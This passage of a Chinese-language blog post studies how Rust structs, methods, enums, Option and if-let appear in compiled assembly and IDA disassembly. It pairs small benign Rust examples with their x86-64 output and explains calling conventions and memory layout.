<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> revlab::User struc ; (<span class="keyword">sizeof</span>=<span class="number">0x40</span>, align=<span class="number">0x8</span>, copyof_91)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: _ZN6revlab4main17h1e5ad0972ab6a820E/r</span><br><span class="line"><span class="number">00000000</span>                                         ; _ZN6revlab4main17h1e5ad0972ab6a820E/r</span><br><span class="line"><span class="number">00000000</span> username alloc::<span class="built_in">string</span>::String ?        ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">65</span>/w</span><br><span class="line"><span class="number">00000000</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">72</span>/w</span><br><span class="line"><span class="number">00000018</span> email alloc::<span class="built_in">string</span>::String ?           ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">77</span>/o</span><br><span class="line"><span class="number">00000018</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">84</span>/w ...</span><br><span class="line"><span class="number">00000030</span> sign_in_count dq ?                      ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">93</span>/w</span><br><span class="line"><span class="number">00000038</span> active db ?                             ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">9</span>C/w</span><br><span class="line"><span class="number">00000038</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">11</span>C/o</span><br><span class="line"><span class="number">00000039</span> db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>A db ? ; undefined</span><br><span class="line"><span class="number">0000003B</span> db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>C db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>D db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>E db ? ; undefined</span><br><span class="line"><span class="number">0000003F</span> db ? ; undefined</span><br></pre></td></tr></table></figure>
<h3 id="第三段"><a class="markdownIt-Anchor" href="#第三段"></a> 第三段</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.LBB17_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 40]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 32]</span><br><span class="line">        mov     qword ptr [rsp], rcx</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        lea     rax, [rsp + 104]</span><br><span class="line">        mov     qword ptr [rsp + 264], rax</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;bool as core::fmt::Display&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 272], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 264]</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 272]</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 24]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 16]</span><br><span class="line">        mov     rdx, qword ptr [rsp + 8]</span><br><span class="line">        mov     rsi, qword ptr [rsp]</span><br><span class="line">        mov     qword ptr [rsp + 216], rsi</span><br><span class="line">        mov     qword ptr [rsp + 224], rdx</span><br><span class="line">        mov     qword ptr [rsp + 232], rcx</span><br><span class="line">        mov     qword ptr [rsp + 240], rax</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">        lea     rdi, [rsp + 168]</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        lea     rcx, [rsp + 216]</span><br><span class="line">        mov     r8d, 2</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        jmp     .LBB17_8</span><br><span class="line">        </span><br><span class="line">.L__unnamed_7:</span><br><span class="line">        .quad   .L__unnamed_2</span><br><span class="line">        .zero   8</span><br><span class="line">        .quad   .L__unnamed_11</span><br><span class="line">        .asciz  &quot;\002\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_12</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        </span><br><span class="line">.L__unnamed_11:</span><br><span class="line">        .ascii  &quot;, &quot;</span><br><span class="line"></span><br><span class="line">.L__unnamed_12:</span><br><span class="line">        .ascii  &quot;\n&quot;</span><br></pre></td></tr></table></figure>
<p>这一段的工作主要就是输出，通过调试发现，新版rustc在使用<code>println!</code>宏时将不再将临时字符串切片参数保存在栈中，但通过IDA依然可以较为容易地辨别。</p>
<h2 id="struct-作为返回值"><a class="markdownIt-Anchor" href="#struct-作为返回值"></a> Struct 作为返回值</h2>
<p>下面书中给出一个通过函数初始化结构体的实例：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    sign_in_count: <span class="type">u64</span>,</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">build_user</span>(email: <span class="type">String</span>, username: <span class="type">String</span>) <span class="punctuation">-&gt;</span> User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,</span><br><span class="line">        username,</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user1</span> = <span class="title function_ invoke__">build_user</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>), <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, user1.email, user1.active);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">example::build_user:</span><br><span class="line">        mov     rax, rdi</span><br><span class="line">        mov     rcx, qword ptr [rdx]</span><br><span class="line">        mov     qword ptr [rdi], rcx</span><br><span class="line">        mov     rcx, qword ptr [rdx + 8]</span><br><span class="line">        mov     qword ptr [rdi + 8], rcx</span><br><span class="line">        mov     rcx, qword ptr [rdx + 16]</span><br><span class="line">        mov     qword ptr [rdi + 16], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi]</span><br><span class="line">        mov     qword ptr [rdi + 24], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi + 8]</span><br><span class="line">        mov     qword ptr [rdi + 32], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi + 16]</span><br><span class="line">        mov     qword ptr [rdi + 40], rcx</span><br><span class="line">        mov     qword ptr [rdi + 48], 1</span><br><span class="line">        mov     byte ptr [rdi + 56], 1</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>从函数的汇编可以看到，这个函数实际上是将第一个参数作为指针完成初始化的，可以将第一个指针理解为<code>this</code>，这与C++类方法的函数调用规则类似。</p>
<h2 id="实现-debug-trait"><a class="markdownIt-Anchor" href="#实现-debug-trait"></a> 实现 Debug Trait</h2>
<p>一个结构体可以通过<code>#[derive(Debug)]</code>完成对Debug Trait的默认实现：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;rect1 = &#123;:?&#125;&quot;</span>, rect1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 88</span><br><span class="line">        mov     dword ptr [rsp], 30</span><br><span class="line">        mov     dword ptr [rsp + 4], 50</span><br><span class="line">        mov     rax, rsp</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;example::Rect as core::fmt::Debug&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 80], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 72]</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 56], rcx</span><br><span class="line">        mov     qword ptr [rsp + 64], rax</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_4]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 56]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        add     rsp, 88</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，汇编代码中获取的就是<code>Debug</code>这个<code>Trait</code>的函数指针，说明不同的宏实际上调用的函数也不同。如果将<code>&#123;:?&#125;</code>修改为<code>&#123;:#?&#125;</code>，则原先调用的<code>core::fmt::Arguments::new_v1</code>将会改为调用<code>core::fmt::Arguments::new_v1_formatted</code>。考虑到Rust的格式化字符串非常强大与灵活，有多种输出形式，后面将通过专门的分析对宏展开进行分析，这里不深入探讨。</p>
<h2 id="reverse-for-methods"><a class="markdownIt-Anchor" href="#reverse-for-methods"></a> Reverse for Methods</h2>
<p>在Rust中，结构体充当了其他语言中类的功能，可以在结构体下定义方法，使这个方法专属于该结构体。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;area = &#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">area</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">example::Rect::area:</span><br><span class="line">        push    rax</span><br><span class="line">        mov     eax, dword ptr [rdi]</span><br><span class="line">        mul     dword ptr [rdi + 4]</span><br><span class="line">        mov     dword ptr [rsp + 4], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_2</span><br><span class="line">        mov     eax, dword ptr [rsp + 4]</span><br><span class="line">        pop     rcx</span><br><span class="line">        ret</span><br><span class="line">.LBB1_2:</span><br><span class="line">        lea     rdi, [rip + str.0]</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_4]</span><br><span class="line">        mov     rax, qword ptr [rip + core::panicking::panic@GOTPCREL]</span><br><span class="line">        mov     esi, 33</span><br><span class="line">        call    rax</span><br><span class="line">        ud2</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">        sub     rsp, 104</span><br><span class="line">        mov     dword ptr [rsp + 8], 30</span><br><span class="line">        mov     dword ptr [rsp + 12], 50</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        call    example::Rect::area</span><br><span class="line">        mov     dword ptr [rsp + 84], eax</span><br><span class="line">        lea     rax, [rsp + 84]</span><br><span class="line">        mov     qword ptr [rsp + 88], rax</span><br><span class="line">        mov     rax, qword ptr [rip + core::fmt::num::imp::&lt;impl core::fmt::Display for u32&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 96], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 88]</span><br><span class="line">        mov     rax, qword ptr [rsp + 96]</span><br><span class="line">        mov     qword ptr [rsp + 64], rcx</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 64]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        add     rsp, 104</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>由上述汇编可知，这里还是将<code>rdi</code>作为<code>self</code>使用。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">can_hold</span>(&amp;<span class="keyword">self</span>, other: &amp;Rect) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width &gt; other.width &amp;&amp; <span class="keyword">self</span>.height &gt; other.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect2</span> = Rect &#123;width: <span class="number">10</span>, height: <span class="number">40</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">can_hold</span>(&amp;rect2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上面的代码，<code>can_hold</code>方法的参数有两个，都是指针，如果将第二个参数的<code>&amp;</code>去掉，则参数有三个。经过试验发现，当一个结构体中的元素数量较少时，不加<code>&amp;</code>可能会将结构体的每个元素分别作为参数传递，当元素数量较多时，则是首先复制然后传递指针。</p>
<p>对于关联函数，由于其第一个参数并不是<code>self</code>，类似于C++中的类静态函数，不需要首先获取结构体实例即可调用，参数传递与一般的函数相同。</p>
<h1 id="reverse-for-enum-part-2"><a class="markdownIt-Anchor" href="#reverse-for-enum-part-2"></a> Reverse for enum (Part 2)</h1>
<p>对于枚举类型，我们在第二篇文章中已经进行了较为详细的解释，对于枚举类型的内存排布有了一定的了解。</p>
<p>下面对枚举类型中定义的方法进行测试。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::any::Any;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Freshman</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Sophomore</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Junior</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Senior</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_student</span>(grade: <span class="type">i32</span>, name: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;Student&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> grade &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Freshman</span>(name)),</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Sophomore</span>(name)),</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Junior</span>(name)),</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(name)),</span><br><span class="line">        _ =&gt; <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">test</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Student::<span class="title function_ invoke__">Freshman</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Calculus&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Sophomore</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Data Structure&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Junior</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Computer Network&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Senior</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Graduation Design&quot;</span>).<span class="title function_ invoke__">to_string</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="title function_ invoke__">test</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中对于<code>test</code>方法的调用如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, qword ptr [rip + core::option::Option&lt;T&gt;::unwrap@GOTPCREL]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 32], rdi</span><br><span class="line">call    rax</span><br><span class="line">mov     rsi, qword ptr [rsp + 32]</span><br><span class="line">lea     rdi, [rsp + 192]</span><br><span class="line">call    example::Student::test</span><br><span class="line">jmp     .LBB26_3</span><br></pre></td></tr></table></figure>
<p>可以看到方法的第一个参数依然是<code>self</code>，第二个参数则是等待初始化的<code>String</code>实例地址。在代码中是返回<code>String</code>实例，实际上是传入未初始化的指针。</p>
<h2 id="optiont"><a class="markdownIt-Anchor" href="#optiont"></a> <code>Option&lt;T&gt;</code></h2>
<p>针对<code>Option&lt;T&gt;</code>，Rust在汇编层有自己的处理方式。如果将<code>Option&lt;T&gt;</code>看做一个普通的枚举类型，且<code>Some</code>后面带的是另一个枚举类型，那么这样的话就会产生两层枚举对象，不太优雅。对于<code>get_student</code>函数，下面是部分反编译结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000009702 48 89 4C 24 18                mov     [rsp+108h+var_F0], rcx</span><br><span class="line">.text:0000000000009707 83 E8 03                      sub     eax, 3</span><br><span class="line">.text:000000000000970A 77 15                         ja      short def_971F                  ; jumptable 000000000000971F default case</span><br><span class="line">.text:000000000000970A</span><br><span class="line">.text:000000000000970C 48 8B 44 24 18                mov     rax, [rsp+108h+var_F0]</span><br><span class="line">.text:0000000000009711 48 8D 0D B4 09 04 00          lea     rcx, jpt_971F</span><br><span class="line">.text:0000000000009718 48 63 04 81                   movsxd  rax, ds:(jpt_971F - 4A0CCh)[rcx+rax*4]</span><br><span class="line">.text:000000000000971C 48 01 C8                      add     rax, rcx</span><br><span class="line">.text:000000000000971F FF E0                         jmp     rax                             ; switch jump</span><br><span class="line">.text:000000000000971F</span><br><span class="line">.text:0000000000009721                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000009721</span><br><span class="line">.text:0000000000009721                               def_971F:                               ; CODE XREF: revlab::get_student::h5c77d454e35cea03+3A↑j</span><br><span class="line">.text:0000000000009721 48 8B 44 24 08                mov     rax, [rsp+108h+var_100]         ; jumptable 000000000000971F default case</span><br><span class="line">.text:0000000000009726 48 C7 00 04 00 00 00          mov     qword ptr [rax], 4</span><br><span class="line">.text:000000000000972D E9 43 02 00 00                jmp     loc_9975</span><br></pre></td></tr></table></figure>
<p>下面的<code>def_971F</code>为默认分支，可以看到这里是将枚举类型的索引值赋值为4，但上面定义的枚举类型一共只有4个值，最大的索引值只能为3。将索引值设置为4实际上也就表示这个枚举类型是一个无效值，这样在内存中实际上并不存在二重枚举类型，而是只有一个<code>Student</code>枚举类型。由此可见，对泛型参数为枚举类型的<code>Option</code>，Rust进行了优化。</p>
<h1 id="reverse-for-if-let"><a class="markdownIt-Anchor" href="#reverse-for-if-let"></a> Reverse for if-let</h1>
<p>if let语句是针对只有一个处理条件和一个默认条件的<code>match</code>语句的平替。由于只有一个特殊条件和默认条件，因此在实际实现中只需要使用类似于if的逻辑即可完成。</p>
